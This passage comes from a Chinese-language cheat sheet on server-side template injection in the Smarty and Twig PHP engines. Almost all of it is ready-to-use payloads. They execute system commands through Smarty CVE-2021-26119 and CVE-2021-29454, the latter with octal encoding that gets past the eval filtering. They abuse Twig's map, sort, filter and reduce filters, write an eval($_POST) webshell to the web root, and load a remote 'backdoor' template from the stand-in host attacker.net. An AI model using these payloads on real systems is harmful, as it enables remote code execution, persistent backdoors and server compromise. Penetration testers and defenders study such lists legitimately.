string:{function name='x(){};system("ls /");function '}{/function}
```

##### CVE-2021-26119

- 可以通过 {$smarty.template_object} 访问到 smarty 对象所导致。
- 版本限制：这个漏洞还没有被修复，4.1.0 跟 3.1.44 都能注入恶意代码。

```php
string:{$smarty.template_object->smarty->_getSmartyObj()->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->enableSecurity()->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->disableSecurity()->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->addTemplateDir('./x')->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->setTemplateDir('./x')->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->addPluginsDir('./x')->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->setPluginsDir('./x')->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->setCompileDir('./x')->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->setCacheDir('./x')->display('string:{system(whoami)}')}
```

##### CVE-2021-29454

php 的 eval() 支持传入 8 或 16 进制数据，以下代码在 php7 版本都可以顺利执行，由于 php5 不支持 `(system)(whoami);` 这种方式执行代码，所以 php5 的 8 进制方式用不了：

- `libs/plugins/function.math.php` 中的 `smarty_function_math` 执行了 eval()，而 eval() 的数据可以通过 8 进制数字绕过安全处理。
- 版本限制：在 3.1.42 和 4.0.2 中修复，小于这两个版本可用。

```php
eval:{math equation='("\163\171\163\164\145\155")("\167\150\157\141\155\151")'}
eval('("\163\171\163\164\145\155")("\167\150\157\141\155\151");');
eval("\x73\x79\x73\x74\x65\x6d\x28\x77\x68\x6f\x61\x6d\x69\x29\x3b");
```

#### Twig

Twig 是一个灵活、快速、安全的 PHP 模板语言。它将模板编译成经过优化的原始 PHP 代码。Twig 拥有一个 Sandbox 模型来检测不可信的模板代码。

##### POC

`Payload => {{2*3}}`

```php
{{["id"]|map("system")|join(",")
{{["id", 0]|sort("system")|join(",")}}
{{["id"]|filter("system")|join(",")}}
{{[0, 0]|reduce("system", "id")|join(",")}}
{{{"<?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}
```

##### 搜集信息

```php
{{_self}} #指向当前应用
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
```

##### Twig 1.x

以下 Payload 可以调用 `setCache` 方法改变 Twig 加载 PHP 文件的路径，在 `allow_url_include` 开启的情况下我们可以通过改变路径实现远程文件包含

```php
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
```

如果在 `getFilter` 里发现了危险函数如： `call_user_func`。通过传递参数到该函数中，我们可以调用任意 PHP 函数

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
// Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

##### Twig 2.x / 3.x

到了 Twig 2.x / 3.x 版本中，`__self` 变量在 SSTI 中早已失去了他的作用，但我们可以借助新版本中的一些过滤器实现攻击目的。

###### map 过滤器

在 Twig 3.x 中，`map` 这个过滤器可以允许用户传递一个箭头函数

```php
{{["id"]|map("system")}}
{{["id"]|map("passthru")}}
{{["id"]|map("exec")}}    // 无回显
{{["phpinfo();"]|map("assert")|join(",")}}
{{{"<?php phpinfo();eval($_POST[whoami])":"/var/www/html/shell.php"}|map("file_put_contents")}}    // 写 Webshell
```

###### sort 过滤器

使用sort 过滤器可以传递一个箭头函数来对数组进行排序

```php
{{["id", 0]|sort("system")}}
{{["id", 0]|sort("passthru")}}
{{["id", 0]|sort("exec")}}    // 无回显
```

###### filter 过滤器

```php
{{["id"]|filter("system")}}
{{["id"]|filter("passthru")}}
{{["id"]|filter("exec")}}    // 无回显
```

###### reduce 过滤器

```php
{{[0, 0]|reduce("system", "id")}}
{{[0, 0]|reduce("passthru", "id")}}
{{[0, 0]|reduce("exec", "id")}}    // 无回显
```

